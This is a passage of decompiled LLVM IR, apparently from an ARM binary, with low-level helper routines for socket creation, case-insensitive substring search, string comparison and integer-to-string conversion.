  %v0_13cb0 = phi i32 [ %v1_13c98, %dec_label_pc_13ca4 ], [ %v1_13c98, %dec_label_pc_13c98 ], [ %v0_13c98, %dec_label_pc_13c78 ]
  %v2_13cb0 = icmp eq i32 %v0_13cb0, 0
  %v1_13cb4 = load i32, i32* %r8.global-to-local, align 4
  %storemerge = select i1 %v2_13cb0, i32 0, i32 %v1_13cb4
  %v2_13cbc = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_13cbc, i32* @r4, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_13c90, { 1, 0 }
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i8 10, { 7, 1, 0, 8, 2, 3, 4, 5, 6 }
  uselistorder i32 (i32, i32*, i32)* @read, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13cb0, { 1, 2, 0 }
}

define i32 @function_13cc0() local_unnamed_addr {
dec_label_pc_13cc0:
  store i32 16, i32* @r4, align 4
  %v0_13cd0 = call i32* @__errno_location()
  store i32 0, i32* @r6, align 4
  store i32 0, i32* %v0_13cd0, align 4
  %v0_13ce4 = load i32, i32* @r6, align 4
  %v3_13ce8 = call i32 @_socket(i32 2, i32 2, i32 %v0_13ce4)
  unreachable

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @_socket, { 5, 1, 4, 15, 16, 14, 13, 2, 12, 11, 10, 9, 3, 8, 7, 6, 0 }
  uselistorder i32* @r6, { 41, 42, 43, 44, 40, 0, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 6, 28, 29, 30, 1, 31, 32, 33, 34, 35, 36, 37, 38, 39, 45, 48, 46, 47, 49, 50, 7, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 3, 66, 67, 68, 69, 70, 71, 73, 4, 72, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 2, 5, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114 }
  uselistorder i32* ()* @__errno_location, { 4, 3, 2, 1, 0, 5 }
}

define i32 @function_13d5c(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13d5c:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp20 = ptrtoint i8* %arg1 to i32
  %v3_13d60 = load i8, i8* %tmp, align 1
  %v2_13d64 = icmp eq i8 %v3_13d60, 0
  br i1 %v2_13d64, label %bb, label %dec_label_pc_13d78

bb:                                               ; preds = %dec_label_pc_13d5c
  %v4_13d60 = zext i8 %v3_13d60 to i32
  br label %dec_label_pc_13d8c

dec_label_pc_13d78:                               ; preds = %dec_label_pc_13d5c
  br label %dec_label_pc_13d7c

dec_label_pc_13d7c:                               ; preds = %dec_label_pc_13d7c, %dec_label_pc_13d78
  %v0_13d7c = phi i32 [ %v1_13d7c, %dec_label_pc_13d7c ], [ 0, %dec_label_pc_13d78 ]
  %v1_13d7c = add i32 %v0_13d7c, 1
  %v2_13d80 = add i32 %v1_13d7c, %arg2
  %v3_13d80 = inttoptr i32 %v2_13d80 to i8*
  %v4_13d80 = load i8, i8* %v3_13d80, align 1
  %v2_13d84 = icmp eq i8 %v4_13d80, 0
  br i1 %v2_13d84, label %dec_label_pc_13d8c, label %dec_label_pc_13d7c

dec_label_pc_13d8c:                               ; preds = %dec_label_pc_13d7c, %bb
  %v0_13dd018 = phi i32 [ %v4_13d60, %bb ], [ %v1_13d7c, %dec_label_pc_13d7c ]
  %v0_13d941 = load i32, i32* @r1, align 4
  %tmp27 = icmp slt i32 %v0_13d941, 1
  br i1 %tmp27, label %dec_label_pc_13de0, label %dec_label_pc_13da0

dec_label_pc_13da0:                               ; preds = %dec_label_pc_13d8c, %dec_label_pc_13d94.backedge
  %v0_13d98.in = phi i32 [ %v0_13d98, %dec_label_pc_13d94.backedge ], [ %v0_13d941, %dec_label_pc_13d8c ]
  %v0_13dc4 = phi i32 [ %v1_13dc4., %dec_label_pc_13d94.backedge ], [ 0, %dec_label_pc_13d8c ]
  %v0_13da0 = phi i32 [ %v5_13da0, %dec_label_pc_13d94.backedge ], [ %tmp20, %dec_label_pc_13d8c ]
  %v0_13d98 = add i32 %v0_13d98.in, -1
  %v1_13da0 = inttoptr i32 %v0_13da0 to i8*
  %v2_13da0 = load i8, i8* %v1_13da0, align 1
  %v3_13da0 = zext i8 %v2_13da0 to i32
  %v5_13da0 = add i32 %v0_13da0, 1
  %v2_13da4 = add i32 %v0_13dc4, %arg2
  %v3_13da4 = inttoptr i32 %v2_13da4 to i8*
  %v4_13da4 = load i8, i8* %v3_13da4, align 1
  %v6_13da4 = zext i8 %v4_13da4 to i32
  %v1_13da8 = add nsw i32 %v3_13da0, -65
  %v1_13dac = add nsw i32 %v6_13da4, -65
  %tmp35 = icmp ult i32 %v1_13da8, 26
  br i1 %tmp35, label %bb28, label %bb29

bb28:                                             ; preds = %dec_label_pc_13da0
  %v5_13db4 = or i32 %v3_13da0, 96
  br label %bb29

bb29:                                             ; preds = %dec_label_pc_13da0, %bb28
  %v0_13dc0 = phi i32 [ %v3_13da0, %dec_label_pc_13da0 ], [ %v5_13db4, %bb28 ]
  %tmp36 = icmp ult i32 %v1_13dac, 26
  br i1 %tmp36, label %bb30, label %bb31

bb30:                                             ; preds = %bb29
  %v5_13dbc = or i32 %v6_13da4, 96
  br label %bb31

bb31:                                             ; preds = %bb29, %bb30
  %v1_13dc0 = phi i32 [ %v6_13da4, %bb29 ], [ %v5_13dbc, %bb30 ]
  %v9_13dc0 = icmp eq i32 %v0_13dc0, %v1_13dc0
  %v1_13dc4 = add i32 %v0_13dc4, 1
  %v1_13dc4. = select i1 %v9_13dc0, i32 %v1_13dc4, i32 0
  br i1 %v9_13dc0, label %dec_label_pc_13dd0, label %dec_label_pc_13d94.backedge

dec_label_pc_13d94.backedge:                      ; preds = %bb31, %dec_label_pc_13dd0
  %tmp32 = icmp slt i32 %v0_13d98, 1
  br i1 %tmp32, label %dec_label_pc_13de0, label %dec_label_pc_13da0

dec_label_pc_13dd0:                               ; preds = %bb31
  %v9_13dd0 = icmp eq i32 %v0_13dd018, %v1_13dc4.
  br i1 %v9_13dd0, label %dec_label_pc_13dd8, label %dec_label_pc_13d94.backedge

dec_label_pc_13dd8:                               ; preds = %dec_label_pc_13dd0
  %v2_13dd8 = sub i32 %v5_13da0, %tmp20
  ret i32 %v2_13dd8

dec_label_pc_13de0:                               ; preds = %dec_label_pc_13d94.backedge, %dec_label_pc_13d8c
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_13dc4., { 1, 0 }
  uselistorder i32 %v0_13da0, { 1, 0 }
  uselistorder i32 %v0_13dc4, { 1, 0 }
  uselistorder i8 %v3_13d60, { 1, 0 }
  uselistorder i32 %tmp20, { 1, 0 }
  uselistorder i32* @r1, { 1, 12, 13, 9, 3, 4, 5, 6, 7, 10, 11, 0, 8, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 2 }
  uselistorder label %dec_label_pc_13d94.backedge, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %dec_label_pc_13da0, { 1, 0 }
}

define i32 @function_13de8(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13de8:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_13de8 = load i8, i8* %arg1, align 1
  %v2_13dec = icmp eq i8 %v2_13de8, 0
  br i1 %v2_13dec, label %bb, label %dec_label_pc_13df8

bb:                                               ; preds = %dec_label_pc_13de8
  %v3_13de8 = zext i8 %v2_13de8 to i32
  br label %dec_label_pc_13e0c

dec_label_pc_13df8:                               ; preds = %dec_label_pc_13de8
  br label %dec_label_pc_13dfc

dec_label_pc_13dfc:                               ; preds = %dec_label_pc_13dfc, %dec_label_pc_13df8
  %v0_13dfc = phi i32 [ %v1_13dfc, %dec_label_pc_13dfc ], [ 0, %dec_label_pc_13df8 ]
  %v1_13dfc = add i32 %v0_13dfc, 1
  %v2_13e00 = add i32 %v1_13dfc, %tmp
  %v3_13e00 = inttoptr i32 %v2_13e00 to i8*
  %v4_13e00 = load i8, i8* %v3_13e00, align 1
  %v2_13e04 = icmp eq i8 %v4_13e00, 0
  br i1 %v2_13e04, label %dec_label_pc_13e0c, label %dec_label_pc_13dfc

dec_label_pc_13e0c:                               ; preds = %dec_label_pc_13dfc, %bb
  %v1_13e30 = phi i32 [ %v3_13de8, %bb ], [ %v1_13dfc, %dec_label_pc_13dfc ]
  %v1_13e0c = inttoptr i32 %arg2 to i8*
  %v2_13e0c = load i8, i8* %v1_13e0c, align 1
  %v2_13e10 = icmp eq i8 %v2_13e0c, 0
  br i1 %v2_13e10, label %bb22, label %dec_label_pc_13e1c

bb22:                                             ; preds = %dec_label_pc_13e0c
  %v3_13e0c = zext i8 %v2_13e0c to i32
  br label %dec_label_pc_13e30

dec_label_pc_13e1c:                               ; preds = %dec_label_pc_13e0c
  br label %dec_label_pc_13e20

dec_label_pc_13e20:                               ; preds = %dec_label_pc_13e20, %dec_label_pc_13e1c
  %v0_13e20 = phi i32 [ %v1_13e20, %dec_label_pc_13e20 ], [ 0, %dec_label_pc_13e1c ]
  %v1_13e20 = add i32 %v0_13e20, 1
  %v2_13e24 = add i32 %v1_13e20, %arg2
  %v3_13e24 = inttoptr i32 %v2_13e24 to i8*
  %v4_13e24 = load i8, i8* %v3_13e24, align 1
  %v2_13e28 = icmp eq i8 %v4_13e24, 0
  br i1 %v2_13e28, label %dec_label_pc_13e30, label %dec_label_pc_13e20

dec_label_pc_13e30:                               ; preds = %dec_label_pc_13e20, %bb22
  %v0_13e5c4 = phi i32 [ %v3_13e0c, %bb22 ], [ %v1_13e20, %dec_label_pc_13e20 ]
  %v9_13e30 = icmp eq i32 %v0_13e5c4, %v1_13e30
  br i1 %v9_13e30, label %dec_label_pc_13e5c.preheader, label %dec_label_pc_13e3c

dec_label_pc_13e5c.preheader:                     ; preds = %dec_label_pc_13e30
  %v2_13e5c6 = icmp eq i32 %v1_13e30, 0
  br i1 %v2_13e5c6, label %dec_label_pc_13e64, label %dec_label_pc_13e44

dec_label_pc_13e3c:                               ; preds = %dec_label_pc_13e44, %dec_label_pc_13e30
  ret i32 0

dec_label_pc_13e44:                               ; preds = %dec_label_pc_13e54, %dec_label_pc_13e5c.preheader
  %v0_13e5c.in = phi i32 [ %v0_13e5c, %dec_label_pc_13e54 ], [ %v1_13e30, %dec_label_pc_13e5c.preheader ]
  %v0_13e58 = phi i32 [ %v1_13e58, %dec_label_pc_13e54 ], [ %arg2, %dec_label_pc_13e5c.preheader ]
  %v0_13e54 = phi i32 [ %v1_13e54, %dec_label_pc_13e54 ], [ %tmp, %dec_label_pc_13e5c.preheader ]
  %v0_13e5c = add i32 %v0_13e5c.in, -1
  %v1_13e44 = inttoptr i32 %v0_13e54 to i8*
  %v2_13e44 = load i8, i8* %v1_13e44, align 1
  %v1_13e48 = inttoptr i32 %v0_13e58 to i8*
  %v2_13e48 = load i8, i8* %v1_13e48, align 1
  %v9_13e4c = icmp eq i8 %v2_13e44, %v2_13e48
  br i1 %v9_13e4c, label %dec_label_pc_13e54, label %dec_label_pc_13e3c

dec_label_pc_13e54:                               ; preds = %dec_label_pc_13e44
  %v1_13e54 = add i32 %v0_13e54, 1
  %v1_13e58 = add i32 %v0_13e58, 1
  %v2_13e5c = icmp eq i32 %v0_13e5c, 0
  br i1 %v2_13e5c, label %dec_label_pc_13e64, label %dec_label_pc_13e44

dec_label_pc_13e64:                               ; preds = %dec_label_pc_13e54, %dec_label_pc_13e5c.preheader
  ret i32 1

; uselistorder directives
  uselistorder i8 %v2_13e0c, { 1, 0 }
  uselistorder i8 %v2_13de8, { 1, 0 }
}

define i32 @function_13e6c(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13e6c:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_13e70 = load i8, i8* %arg1, align 1
  %v2_13e74 = icmp eq i8 %v2_13e70, 0
  %v0_13e78 = load i32, i32* %r2.global-to-local, align 4
  br i1 %v2_13e74, label %bb, label %dec_label_pc_13e84

bb:                                               ; preds = %dec_label_pc_13e6c
  %v3_13e70 = zext i8 %v2_13e70 to i32
  br label %dec_label_pc_13e98

dec_label_pc_13e84:                               ; preds = %dec_label_pc_13e6c
  br label %dec_label_pc_13e88

dec_label_pc_13e88:                               ; preds = %dec_label_pc_13e88, %dec_label_pc_13e84
  %v0_13e88 = phi i32 [ %v1_13e88, %dec_label_pc_13e88 ], [ 0, %dec_label_pc_13e84 ]
  %v1_13e88 = add i32 %v0_13e88, 1
  %v2_13e8c = add i32 %v1_13e88, %tmp
  %v3_13e8c = inttoptr i32 %v2_13e8c to i8*
  %v4_13e8c = load i8, i8* %v3_13e8c, align 1
  %v2_13e90 = icmp eq i8 %v4_13e8c, 0
  br i1 %v2_13e90, label %dec_label_pc_13e98, label %dec_label_pc_13e88

dec_label_pc_13e98:                               ; preds = %dec_label_pc_13e88, %bb
  %v9_13ec0 = phi i32 [ %v3_13e70, %bb ], [ %v1_13e88, %dec_label_pc_13e88 ]
  %v0_13e98 = load i32, i32* %r1.global-to-local, align 4
  %v1_13e98 = inttoptr i32 %v0_13e98 to i8*
  %v2_13e98 = load i8, i8* %v1_13e98, align 1
  %v3_13e98 = zext i8 %v2_13e98 to i32
  %v2_13e9c = icmp eq i8 %v2_13e98, 0
  br i1 %v2_13e9c, label %bb26, label %dec_label_pc_13ea8

bb26:                                             ; preds = %dec_label_pc_13e98
  store i32 %v3_13e98, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13ebc

dec_label_pc_13ea8:                               ; preds = %dec_label_pc_13e98
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13eac

dec_label_pc_13eac:                               ; preds = %dec_label_pc_13eac, %dec_label_pc_13ea8
  %v0_13eac = phi i32 [ %v1_13eac, %dec_label_pc_13eac ], [ 0, %dec_label_pc_13ea8 ]
  %v1_13eac = add i32 %v0_13eac, 1
  store i32 %v1_13eac, i32* %r2.global-to-local, align 4
  %v2_13eb0 = add i32 %v1_13eac, %v0_13e98
  %v3_13eb0 = inttoptr i32 %v2_13eb0 to i8*
  %v4_13eb0 = load i8, i8* %v3_13eb0, align 1
  %v2_13eb4 = icmp eq i8 %v4_13eb0, 0
  br i1 %v2_13eb4, label %dec_label_pc_13ebc, label %dec_label_pc_13eac

dec_label_pc_13ebc:                               ; preds = %dec_label_pc_13eac, %bb26
  %v1_13ebc = phi i32 [ %v3_13e98, %bb26 ], [ %v1_13eac, %dec_label_pc_13eac ]
  %v2_13ebc = sub i32 %v0_13e78, %v1_13ebc
  %v4_13ebc = xor i32 %v1_13ebc, %v0_13e78
  %v5_13ebc = xor i32 %v2_13ebc, %v0_13e78
  %v6_13ebc = and i32 %v5_13ebc, %v4_13ebc
  %v7_13ec0 = icmp sgt i32 %v0_13e78, %v1_13ebc
  br i1 %v7_13ec0, label %bb28, label %bb27

bb27:                                             ; preds = %dec_label_pc_13ebc
  %v10_13ec0 = sub i32 %v0_13e78, %v9_13ec0
  %v12_13ec0 = xor i32 %v9_13ec0, %v0_13e78
  %v13_13ec0 = xor i32 %v10_13ec0, %v0_13e78
  %v14_13ec0 = and i32 %v13_13ec0, %v12_13ec0
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_13ebc, %bb27
  %v2_13ec4.in = phi i32 [ %v6_13ebc, %dec_label_pc_13ebc ], [ %v14_13ec0, %bb27 ]
  %v1_13ec4.in = phi i32 [ %v2_13ebc, %dec_label_pc_13ebc ], [ %v10_13ec0, %bb27 ]
  %v1_13ebc.pn = phi i32 [ %v1_13ebc, %dec_label_pc_13ebc ], [ %v9_13ec0, %bb27 ]
  %v0_13ec4 = icmp eq i32 %v0_13e78, %v1_13ebc.pn
  %v1_13ec4 = icmp slt i32 %v1_13ec4.in, 0
  %v2_13ec4 = icmp slt i32 %v2_13ec4.in, 0
  %v3_13ec4 = xor i1 %v2_13ec4, %v1_13ec4
  %v4_13ec4 = or i1 %v0_13ec4, %v3_13ec4
  br i1 %v4_13ec4, label %dec_label_pc_13ed4.preheader, label %dec_label_pc_13eec

dec_label_pc_13ed4.preheader:                     ; preds = %bb28
  %v2_13ed45 = icmp eq i32 %v0_13e78, 0
  br i1 %v2_13ed45, label %dec_label_pc_13ef4, label %dec_label_pc_13edc

dec_label_pc_13ecc:                               ; preds = %dec_label_pc_13edc
  %v1_13ecc = add i32 %v0_13ecc, 1
  %v1_13ed0 = add i32 %v0_13ed0, 1
  store i32 %v1_13ed0, i32* %r1.global-to-local, align 4
  %v2_13ed4 = icmp eq i32 %v0_13ed4, 0
  br i1 %v2_13ed4, label %dec_label_pc_13ef4, label %dec_label_pc_13edc

dec_label_pc_13edc:                               ; preds = %dec_label_pc_13ecc, %dec_label_pc_13ed4.preheader
  %v0_13ed4.in = phi i32 [ %v0_13ed4, %dec_label_pc_13ecc ], [ %v0_13e78, %dec_label_pc_13ed4.preheader ]
  %v0_13ed0 = phi i32 [ %v1_13ed0, %dec_label_pc_13ecc ], [ %v0_13e98, %dec_label_pc_13ed4.preheader ]
  %v0_13ecc = phi i32 [ %v1_13ecc, %dec_label_pc_13ecc ], [ %tmp, %dec_label_pc_13ed4.preheader ]
  %v0_13ed4 = add i32 %v0_13ed4.in, -1
  %v1_13edc = inttoptr i32 %v0_13ecc to i8*
  %v2_13edc = load i8, i8* %v1_13edc, align 1
  %v3_13edc = zext i8 %v2_13edc to i32
  store i32 %v3_13edc, i32* %r2.global-to-local, align 4
  %v1_13ee0 = inttoptr i32 %v0_13ed0 to i8*
  %v2_13ee0 = load i8, i8* %v1_13ee0, align 1
  %v9_13ee4 = icmp eq i8 %v2_13edc, %v2_13ee0
  br i1 %v9_13ee4, label %dec_label_pc_13ecc, label %dec_label_pc_13eec

dec_label_pc_13eec:                               ; preds = %dec_label_pc_13edc, %bb28
  ret i32 0

dec_label_pc_13ef4:                               ; preds = %dec_label_pc_13ecc, %dec_label_pc_13ed4.preheader
  ret i32 1

; uselistorder directives
  uselistorder i32 %v0_13ecc, { 1, 0 }
  uselistorder i32 %v0_13ed0, { 1, 0 }
  uselistorder i32 %v1_13ebc, { 0, 3, 1, 2 }
  uselistorder i32 %v1_13eac, { 0, 1, 3, 2 }
  uselistorder i32 %v0_13e78, { 0, 6, 1, 2, 3, 7, 9, 4, 5, 8 }
  uselistorder i8 %v2_13e70, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 5, 4, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %bb28, { 1, 0 }
}

define i32 @function_13efc(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13efc:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = sext i8 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-62 = alloca i32, align 4
  %stack_var_-30 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_13efc = load i32, i32* @r4, align 4
  store i32 %v3_13efc, i32* %stack_var_-28, align 4
  %v22_13efc = ptrtoint i32* %stack_var_-28 to i32
  %v0_13f00 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_13f00, i32* %r8.global-to-local, align 4
  %v2_13f00 = icmp eq i32 %v0_13f00, 0
  store i1 %v2_13f00, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %r5.global-to-local, align 4
  br i1 %v2_13f00, label %dec_label_pc_13ff0, label %dec_label_pc_13f10

dec_label_pc_13f10:                               ; preds = %dec_label_pc_13efc
  %v3_13f10 = icmp eq i8 %arg1, 0
  store i1 %v3_13f10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_13f10, label %.thread, label %dec_label_pc_13f24

.thread:                                          ; preds = %dec_label_pc_13f10
  %v4_13f18 = inttoptr i32 %v0_13f00 to i8*
  store i8 48, i8* %v4_13f18, align 1
  %v0_13f1c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13f1c.pr.pr, label %.thread1, label %dec_label_pc_13f24

.thread1:                                         ; preds = %.thread
  %v4_13f1c = load i32, i32* %r8.global-to-local, align 4
  %v5_13f1c = add i32 %v4_13f1c, 1
  %v6_13f1c = inttoptr i32 %v5_13f1c to i8*
  store i8 0, i8* %v6_13f1c, align 1
  %v0_13f20.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13f20.pr.pr, label %dec_label_pc_13ff0, label %dec_label_pc_13f24

dec_label_pc_13f24:                               ; preds = %dec_label_pc_13f10, %.thread, %.thread1
  %tmp40 = icmp slt i8 %arg1, 0
  %v7_13f28 = icmp eq i32 %arg2, 10
  store i1 %v7_13f28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13f28, label %bb, label %.thread22

.thread22:                                        ; preds = %dec_label_pc_13f24
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread4

bb:                                               ; preds = %dec_label_pc_13f24
  %v4_13f24 = zext i1 %tmp40 to i32
  store i32 %v4_13f24, i32* %r2.global-to-local, align 4
  %phitmp = icmp eq i1 %tmp40, false
  store i1 %phitmp, i1* %cpsr_z.global-to-local, align 1
  br i1 %phitmp, label %.thread4, label %dec_label_pc_13f4c

.thread4:                                         ; preds = %bb, %.thread22
  br label %dec_label_pc_13f5c

dec_label_pc_13f4c:                               ; preds = %bb
  %v2_13f4c = sub nsw i32 0, %tmp
  store i1 %v3_13f10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_13f10, label %dec_label_pc_13ffc, label %dec_label_pc_13f5c

dec_label_pc_13f5c:                               ; preds = %dec_label_pc_13f4c, %.thread4
  %v0_13f6410 = phi i32 [ %tmp, %.thread4 ], [ %v2_13f4c, %dec_label_pc_13f4c ]
  %storemerge = phi i32 [ 0, %.thread4 ], [ 1, %dec_label_pc_13f4c ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  store i32 32, i32* %r6.global-to-local, align 4
  %v2_13f60 = ptrtoint i32* %stack_var_-30 to i32
  store i32 %v2_13f60, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13f64

dec_label_pc_13f64:                               ; preds = %bb38, %dec_label_pc_13f5c
  %v2_13f84 = phi i32 [ %v5_13f84, %bb38 ], [ %v2_13f60, %dec_label_pc_13f5c ]
  %v0_13f80 = phi i32 [ %v2_13f88, %bb38 ], [ %v0_13f6410, %dec_label_pc_13f5c ]
  %v0_13f68 = load i32, i32* %r5.global-to-local, align 4
  %v2_13f6c = urem i32 %v0_13f80, %v0_13f68
  store i32 %v2_13f6c, i32* %r0.global-to-local, align 4
  %v7_13f70 = icmp eq i32 %v2_13f6c, 9
  store i1 %v7_13f70, i1* %cpsr_z.global-to-local, align 1
  %v1_13f74 = add i32 %v2_13f6c, 48
  store i32 %v0_13f68, i32* %r1.global-to-local, align 4
  %v7_13f7c = icmp sgt i32 %v2_13f6c, 9
  %extract.t = trunc i32 %v1_13f74 to i8
  br i1 %v7_13f7c, label %bb37, label %bb38

bb37:                                             ; preds = %dec_label_pc_13f64
  %v9_13f7c = add i32 %v2_13f6c, 55
  %extract.t21 = trunc i32 %v9_13f7c to i8
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_13f64, %bb37
  %v0_13f84.off0 = phi i8 [ %extract.t, %dec_label_pc_13f64 ], [ %extract.t21, %bb37 ]
  store i32 %v0_13f80, i32* %r0.global-to-local, align 4
  %v3_13f84 = inttoptr i32 %v2_13f84 to i8*
  store i8 %v0_13f84.off0, i8* %v3_13f84, align 1
  %v4_13f84 = load i32, i32* %r7.global-to-local, align 4
  %v5_13f84 = add i32 %v4_13f84, -1
  store i32 %v5_13f84, i32* %r7.global-to-local, align 4
  %v0_13f88 = load i32, i32* %r0.global-to-local, align 4
  %v1_13f88 = load i32, i32* %r1.global-to-local, align 4
  %v2_13f88 = udiv i32 %v0_13f88, %v1_13f88
  store i32 %v2_13f88, i32* %r0.global-to-local, align 4
  %v2_13f8c = icmp ugt i32 %v1_13f88, %v0_13f88
  store i1 %v2_13f8c, i1* %cpsr_z.global-to-local, align 1
  %v0_13f90 = load i32, i32* %r6.global-to-local, align 4
  %v1_13f90 = add i32 %v0_13f90, -1
  store i32 %v1_13f90, i32* %r6.global-to-local, align 4
  br i1 %v2_13f8c, label %dec_label_pc_13f98, label %dec_label_pc_13f64

dec_label_pc_13f98:                               ; preds = %bb38
  %v0_13f98 = load i32, i32* %sl.global-to-local, align 4
  %v2_13f98 = icmp eq i32 %v0_13f98, 0
  store i1 %v2_13f98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13f98, label %bb39, label %dec_label_pc_14000

bb39:                                             ; preds = %dec_label_pc_13f98
  store i32 %v0_13f90, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13fa4

dec_label_pc_13fa4:                               ; preds = %bb39, %dec_label_pc_14000
  %v1_13fb0 = phi i32 [ %v0_13f90, %bb39 ], [ %v1_13fa8.pre, %dec_label_pc_14000 ]
  %v2_13fa4 = ptrtoint i32* %stack_var_-62 to i32
  %v2_13fa8 = add i32 %v1_13fb0, %v2_13fa4
  %v3_13fa8 = inttoptr i32 %v2_13fa8 to i8*
  %v4_13fa8 = load i8, i8* %v3_13fa8, align 1
  %v6_13fa8 = zext i8 %v4_13fa8 to i32
  store i32 %v6_13fa8, i32* %r2.global-to-local, align 4
  %v2_13fac = icmp eq i8 %v4_13fa8, 0
  store i1 %v2_13fac, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_13fa8, i32* %r1.global-to-local, align 4
  br i1 %v2_13fac, label %dec_label_pc_13fd4, label %dec_label_pc_13fb8

dec_label_pc_13fb8:                               ; preds = %dec_label_pc_13fa4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13fbc

dec_label_pc_13fbc:                               ; preds = %dec_label_pc_13fbc, %dec_label_pc_13fb8
  %v0_13fbc = phi i32 [ %v1_13fbc, %dec_label_pc_13fbc ], [ 0, %dec_label_pc_13fb8 ]
  %v1_13fbc = add i32 %v0_13fbc, 1
  store i32 %v1_13fbc, i32* %r2.global-to-local, align 4
  %v2_13fc0 = add i32 %v1_13fbc, %v2_13fa8
  %v3_13fc0 = inttoptr i32 %v2_13fc0 to i8*
  %v4_13fc0 = load i8, i8* %v3_13fc0, align 1
  %v2_13fc4 = icmp eq i8 %v4_13fc0, 0
  store i1 %v2_13fc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13fc4, label %dec_label_pc_13fcc, label %dec_label_pc_13fbc

dec_label_pc_13fcc:                               ; preds = %dec_label_pc_13fbc
  %v7_13fcc = icmp eq i32 %v0_13fbc, -2
  store i1 %v7_13fcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13fcc, label %dec_label_pc_13ff0, label %dec_label_pc_13fd4

dec_label_pc_13fd4:                               ; preds = %dec_label_pc_13fcc, %dec_label_pc_13fa4
  %v0_13fdc18 = phi i32 [ %v1_13fbc, %dec_label_pc_13fcc ], [ %v6_13fa8, %dec_label_pc_13fa4 ]
  store i32 %v2_13fa8, i32* %r0.global-to-local, align 4
  %v0_13fd8 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_13fd8, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13fdc

dec_label_pc_13fdc:                               ; preds = %dec_label_pc_13fdc.dec_label_pc_13fdc_crit_edge, %dec_label_pc_13fd4
  %v2_13fe8 = phi i32 [ %v5_13fe8, %dec_label_pc_13fdc.dec_label_pc_13fdc_crit_edge ], [ %v0_13fd8, %dec_label_pc_13fd4 ]
  %v0_13fe0 = phi i32 [ %v0_13fe0.pre, %dec_label_pc_13fdc.dec_label_pc_13fdc_crit_edge ], [ %v2_13fa8, %dec_label_pc_13fd4 ]
  %v0_13fdc = phi i32 [ %v0_13fdc.pre, %dec_label_pc_13fdc.dec_label_pc_13fdc_crit_edge ], [ %v0_13fdc18, %dec_label_pc_13fd4 ]
  %v1_13fdc = add i32 %v0_13fdc, -1
  store i32 %v1_13fdc, i32* %r2.global-to-local, align 4
  %v1_13fe0 = inttoptr i32 %v0_13fe0 to i8*
  %v2_13fe0 = load i8, i8* %v1_13fe0, align 1
  %v5_13fe0 = add i32 %v0_13fe0, 1
  store i32 %v5_13fe0, i32* %r0.global-to-local, align 4
  %v3_13fe4 = icmp eq i32 %v0_13fdc, 0
  store i1 %v3_13fe4, i1* %cpsr_z.global-to-local, align 1
  %v3_13fe8 = inttoptr i32 %v2_13fe8 to i8*
  store i8 %v2_13fe0, i8* %v3_13fe8, align 1
  %v4_13fe8 = load i32, i32* %r1.global-to-local, align 4
  %v5_13fe8 = add i32 %v4_13fe8, 1
